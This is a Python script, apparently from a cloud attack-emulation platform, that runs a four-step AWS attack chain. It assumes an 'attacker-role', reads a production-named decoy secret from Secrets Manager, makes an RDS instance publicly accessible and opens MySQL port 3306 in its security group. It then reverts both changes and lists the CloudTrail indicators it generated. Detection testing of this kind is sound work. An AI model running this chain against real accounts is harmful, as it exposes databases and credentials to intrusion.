# FILE: attack.py
"""
ATOMIC-rds-modify-public-access -- Automated Post-Exploitation Attack Script
Executes a 4-step, 1-phase attack chain: RDS public access exposure (T1562.007).

Entry point (backend contract):
    run(outputs: dict, region: str = 'us-east-1') -> None
"""
import sys
import time
import random
import json

# Cross-platform UTF-8 output -- prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

import boto3
from botocore.exceptions import ClientError

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _print(msg):
    print(msg, flush=True)

def print_step(msg):
    _print(f"\n[*] {msg}")

def print_ok(msg):
    _print(f"[+] {msg}")

def print_err(msg):
    _print(f"[-] {msg}")

def op_delay(min_s=2, max_s=6):
    time.sleep(random.uniform(min_s, max_s))

def phase_delay():
    time.sleep(random.uniform(5, 15))


# ---------------------------------------------------------------------------
# RDS readiness poll: wait until status == 'available'
# ---------------------------------------------------------------------------

def _wait_rds_available(rds_client, db_instance_id, timeout_s=600, poll_s=15):
    """Poll DescribeDBInstances until status is 'available'. Returns True or raises."""
    deadline = time.time() + timeout_s
    _print(f"    Polling {db_instance_id} for status 'available' (up to {timeout_s}s) ...")
    while time.time() < deadline:
        try:
            resp = rds_client.describe_db_instances(DBInstanceIdentifier=db_instance_id)
            status = resp["DBInstances"][0]["DBInstanceStatus"]
            _print(f"    Status: {status}")
            if status == "available":
                return True
        except ClientError as e:
            _print(f"    describe_db_instances error: {e}")
        time.sleep(poll_s)
    raise RuntimeError(
        f"Timed out waiting for RDS instance '{db_instance_id}' to reach 'available' "
        f"after {timeout_s}s."
    )


# ---------------------------------------------------------------------------
# Main entry point (backend contract)
# ---------------------------------------------------------------------------

def _bootstrap_session(outputs: dict, region: str):
    """Session for the initial STS AssumeRole call.

    In the MayaTrail backend the worker injects the tenant's short-lived
    assumed-role credentials as outputs['_aws_credentials']; use them so the
    attack runs in the tenant account, not the worker's. Falls back to the
    ambient default session for standalone runs.
    """
    creds = (outputs or {}).get("_aws_credentials")
    if creds:
        return boto3.Session(
            aws_access_key_id=creds.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=creds.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=creds.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def run(outputs: dict, region: str = "us-east-1") -> None:
    """
    Execute the RDS public-access exposure chain (T1562.007).

    Credential chain:
      - Ambient default boto3.Session calls sts:AssumeRole into attacker-role.
      - All subsequent API calls use the attacker_boto3_session derived from
        the AssumeRole response.

    All dynamic values are read exclusively from `outputs`.
    """
    # ---- Resolve required dynamic outputs ----------------------------------
    attacker_role_arn = outputs.get("attacker_role_arn")
    if not attacker_role_arn:
        raise RuntimeError("Missing required output: attacker_role_arn")

    prod_secret_arn = outputs.get("prod_rds_master_secret_arn")
    if not prod_secret_arn:
        raise RuntimeError("Missing required output: prod_rds_master_secret_arn")

    rds_instance_id = outputs.get("rds_instance_id")
    if not rds_instance_id:
        raise RuntimeError("Missing required output: rds_instance_id")

    rds_sg_id = outputs.get("rds_security_group_id")
    if not rds_sg_id:
        raise RuntimeError("Missing required output: rds_security_group_id")

    _print("=" * 66)
    _print("ATOMIC: RDS Modify Public Access (T1562.007)")
    _print("Tactics: Defense Evasion")
    _print(f"Region : {region}")
    _print(f"Target : {rds_instance_id}")
    _print("=" * 66)

    # ======================================================================
    # PHASE 1 -- Impair Cloud Firewall (T1562.007)
    # ======================================================================

    # ------------------------------------------------------------------
    # Step 1/4 -- AssumeRole: pivot into attacker-role
    # Tradecraft: threat actors with any IAM foothold frequently enumerate
    # assumable roles before pivoting; the AssumeRole CloudTrail event from
    # a pipeline/admin principal into a named attacker-role is the initial
    # detection signal.
    # ------------------------------------------------------------------
    print_step("Step 1/4 [T1562.007] - AssumeRole into attacker-role")

    default_session = _bootstrap_session(outputs, region)
    sts = default_session.client("sts", region_name=region)

    try:
        assume_resp = sts.assume_role(
            RoleArn=attacker_role_arn,
            RoleSessionName="atomic-rds-public-access-session",
            DurationSeconds=3600,
        )
        creds = assume_resp["Credentials"]
        print_ok(f"AssumeRole succeeded -> session key {creds['AccessKeyId']}")
        _print(f"    RoleArn         : {attacker_role_arn}")
        _print( "    RoleSessionName : atomic-rds-public-access-session")
        _print( "    CloudTrail IOC  : AssumeRole from pipeline admin into attacker-role")
    except ClientError as e:
        code = e.response["Error"]["Code"]
        print_err(f"AssumeRole failed [{code}]: {e}")
        raise

    attacker_session = boto3.Session(
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds["SessionToken"],
        region_name=region,
    )

    op_delay(2, 4)

    # ------------------------------------------------------------------
    # Step 2/4 -- GetSecretValue: enumerate bait production secret
    # Tradecraft: attackers enumerate credentials before exposing DB
    # endpoints to maximise exfil value. The CloudTrail event (even on
    # AccessDenied) fires GuardDuty CredentialAccess:Secrets findings if
    # the threat detection policy is active. Chain MUST continue regardless
    # of whether the call succeeds or returns AccessDenied.
    # ------------------------------------------------------------------
    print_step("Step 2/4 [T1562.007] - GetSecretValue: enumerating bait prod secret")
    sm = attacker_session.client("secretsmanager", region_name=region)
    try:
        sv_resp = sm.get_secret_value(SecretId=prod_secret_arn)
        print_ok("GetSecretValue succeeded (attacker retrieved decoy credentials).")
        _print(f"    SecretId       : {prod_secret_arn}")
        _print( "    CloudTrail IOC : GetSecretValue on production-named secret from attacker-role session")
    except ClientError as e:
        code = e.response["Error"]["Code"]
        if code in ("AccessDeniedException", "AccessDenied"):
            print_ok(
                f"GetSecretValue returned AccessDenied [{code}] -- "
                "CloudTrail denial record is the detection signal; continuing chain."
            )
            _print(f"    SecretId       : {prod_secret_arn}")
            _print( "    CloudTrail IOC : GetSecretValue AccessDenied on production-named secret")
        else:
            print_err(f"GetSecretValue unexpected error [{code}]: {e}")
            # Non-fatal per attack plan -- log and continue

    op_delay(3, 6)

    # ------------------------------------------------------------------
    # Step 3/4 -- ModifyDBInstance: set publiclyAccessible=True
    # Tradecraft: toggling publiclyAccessible is a low-noise single-API
    # operation that exposes the RDS endpoint to the internet. With
    # ApplyImmediately=True the change takes effect in the current
    # maintenance window without a scheduled reboot, reducing dwell time
    # before access is possible. AWS Security Hub RDS.2 fires within
    # minutes; GuardDuty may fire a UnauthorizedAccess:RDS/PubliclyAccessible
    # finding depending on detector configuration.
    # ------------------------------------------------------------------
    print_step("Step 3/4 [T1562.007] - ModifyDBInstance: set publiclyAccessible=True")
    rds = attacker_session.client("rds", region_name=region)
    try:
        rds.modify_db_instance(
            DBInstanceIdentifier=rds_instance_id,
            PubliclyAccessible=True,
            ApplyImmediately=True,
        )
        print_ok(f"ModifyDBInstance succeeded -> publiclyAccessible=True on {rds_instance_id}")
        _print( "    CloudTrail IOC  : ModifyDBInstance requestParameters.publiclyAccessible=true")
        _print( "    Security Hub    : RDS.2 will fire (RDS DB should prohibit public access)")
    except ClientError as e:
        code = e.response["Error"]["Code"]
        print_err(f"ModifyDBInstance (expose) failed [{code}]: {e}")
        raise

    op_delay(2, 5)

    # ------------------------------------------------------------------
    # Step 4/4 -- AuthorizeSecurityGroupIngress: open tcp/3306 to placeholder CIDR
    # Tradecraft: after exposing the endpoint the attacker punches a hole
    # in the attached security group to allow MySQL connections from a
    # staging range. CIDR 10.99.254.0/24 is a non-routable placeholder
    # per emulation safety policy -- never 0.0.0.0/0.
    # ------------------------------------------------------------------
    print_step("Step 4/4 [T1562.007] - AuthorizeSecurityGroupIngress: open tcp/3306 to 10.99.254.0/24")
    ec2 = attacker_session.client("ec2", region_name=region)
    sg_rule_added = False
    try:
        ec2.authorize_security_group_ingress(
            GroupId=rds_sg_id,
            IpPermissions=[
                {
                    "IpProtocol": "tcp",
                    "FromPort": 3306,
                    "ToPort": 3306,
                    "IpRanges": [
                        {
                            "CidrIp": "10.99.254.0/24",
                            "Description": "emulation-placeholder",
                        }
                    ],
                }
            ],
        )
        sg_rule_added = True
        print_ok(f"AuthorizeSecurityGroupIngress succeeded -> tcp/3306 open to 10.99.254.0/24 on {rds_sg_id}")
        _print( "    CloudTrail IOC  : AuthorizeSecurityGroupIngress tcp/3306 10.99.254.0/24 from attacker-role session")
        _print( "    AWS Config IOC  : restricted-common-ports rule violation on port 3306")
    except ClientError as e:
        code = e.response["Error"]["Code"]
        if code == "InvalidPermission.Duplicate":
            sg_rule_added = True  # Rule already exists from a prior run; treat as added for cleanup
            print_ok("AuthorizeSecurityGroupIngress: rule already present (prior run artifact) -- treating as added.")
        else:
            print_err(f"AuthorizeSecurityGroupIngress failed [{code}]: {e}")
            # Continue to cleanup regardless

    op_delay(2, 4)

    # ======================================================================
    # CLEANUP -- Revert both changes before returning
    # ======================================================================
    _print("\n" + "-" * 66)
    _print("[*] CLEANUP: reverting emulation changes")
    _print("-" * 66)

    # -- Cleanup 1: RevokeSecurityGroupIngress ----------------------------
    if sg_rule_added:
        print_step("Cleanup 1/2 - RevokeSecurityGroupIngress: removing tcp/3306 10.99.254.0/24")
        try:
            ec2.revoke_security_group_ingress(
                GroupId=rds_sg_id,
                IpPermissions=[
                    {
                        "IpProtocol": "tcp",
                        "FromPort": 3306,
                        "ToPort": 3306,
                        "IpRanges": [{"CidrIp": "10.99.254.0/24"}],
                    }
                ],
            )
            print_ok(f"RevokeSecurityGroupIngress succeeded -- rule removed from {rds_sg_id}")
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code == "InvalidPermission.NotFound":
                print_ok("RevokeSecurityGroupIngress: rule not found (already removed).")
            else:
                print_err(
                    f"RevokeSecurityGroupIngress failed [{code}]: {e}\n"
                    f"    Manual cleanup: call RevokeSecurityGroupIngress on {rds_sg_id} "
                    "for tcp/3306 10.99.254.0/24"
                )
    else:
        _print("[*] Cleanup 1/2 - sg rule was not added, skipping revoke.")

    op_delay(1, 3)

    # -- Cleanup 2: Restore publiclyAccessible=False -----------------------
    # Poll until 'available', then restore. Retry ModifyDBInstance up to 3
    # times on InvalidDBInstanceState (instance may be in modifying state).
    print_step("Cleanup 2/2 - Restore publiclyAccessible=False on RDS instance")
    try:
        _wait_rds_available(rds, rds_instance_id, timeout_s=600, poll_s=15)
    except RuntimeError as e:
        print_err(f"RDS availability poll timed out: {e}")
        print_err(
            f"    Manual cleanup: call modify_db_instance({rds_instance_id}, "
            "PubliclyAccessible=False, ApplyImmediately=True)"
        )
    else:
        restored = False
        for attempt in range(1, 4):
            try:
                rds.modify_db_instance(
                    DBInstanceIdentifier=rds_instance_id,
                    PubliclyAccessible=False,
                    ApplyImmediately=True,
                )
                print_ok(
                    f"ModifyDBInstance (restore) succeeded -> publiclyAccessible=False "
                    f"on {rds_instance_id} (attempt {attempt})"
                )
                restored = True
                break
            except ClientError as e:
                code = e.response["Error"]["Code"]
                if code == "InvalidDBInstanceState" and attempt < 3:
                    _print(f"    InvalidDBInstanceState on attempt {attempt} -- retrying in 15s ...")
                    time.sleep(15)
                else:
                    print_err(
                        f"ModifyDBInstance (restore) failed [{code}] after {attempt} attempt(s): {e}\n"
                        f"    Manual cleanup: modify_db_instance({rds_instance_id}, "
                        "PubliclyAccessible=False, ApplyImmediately=True)"
                    )
                    break
        if not restored:
            print_err(
                "    WARN: publiclyAccessible may still be True -- "
                "run pulumi destroy or restore manually."
            )

    # ======================================================================
    # Summary
    # ======================================================================
    _print("\n" + "=" * 66)
    _print("EMULATION COMPLETE -- CloudTrail Events Generated")
    _print("=" * 66)
    _print("  Step 1  AssumeRole                      sts.amazonaws.com          [low]")
    _print("  Step 2  GetSecretValue (or AccessDenied) secretsmanager.amazonaws.com [low]")
    _print("  Step 3  ModifyDBInstance (public=true)   rds.amazonaws.com          [medium]")
    _print("  Step 4  AuthorizeSecurityGroupIngress    ec2.amazonaws.com          [medium]")
    _print("")
    _print("  Technique : T1562.007 Impair Defenses - Disable or Modify Cloud Firewall")
    _print("  Tactic    : Defense Evasion")
    _print(f"  Target    : {rds_instance_id} / {rds_sg_id}")
    _print("")
    _print("  Cleanup 1 : RevokeSecurityGroupIngress tcp/3306 10.99.254.0/24 (inline)")
    _print("  Cleanup 2 : ModifyDBInstance publiclyAccessible=False (inline)")
    _print("  Infra     : pulumi destroy handles all remaining resources")
    _print("=" * 66)
